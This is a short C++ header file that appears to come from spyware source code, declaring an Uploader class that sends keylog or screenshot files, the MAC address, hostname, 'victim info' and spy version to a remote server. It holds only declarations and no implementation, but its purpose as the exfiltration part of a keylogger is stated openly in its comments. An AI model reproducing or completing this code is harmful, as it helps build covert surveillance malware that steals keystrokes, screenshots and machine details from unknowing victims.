#pragma once
#include "comm.h"

#define SPY_UPL_HOSTNAME_MAX	100

#define SPY_UPL_HEADER_FILE		1 /* main file which contains keylog or screenshot content */
#define SPY_UPL_HEADER_VER		2 /* spy version */
#define SPY_UPL_HEADER_MAC		3 /* MAC address */
#define SPY_UPL_HEADER_HOSTN	4 /* hostname */

class Uploader: public Comm
{
	void upload_mac();
	void upload_hostname();
	void upload_victim_info();
	void upload_spy_version();
	void upload_file_data(FILE * file);
	void upload_file(FILE * file);
public:
	void upload(const char * file_path);
	Uploader(const char * server_addr, int server_port);
};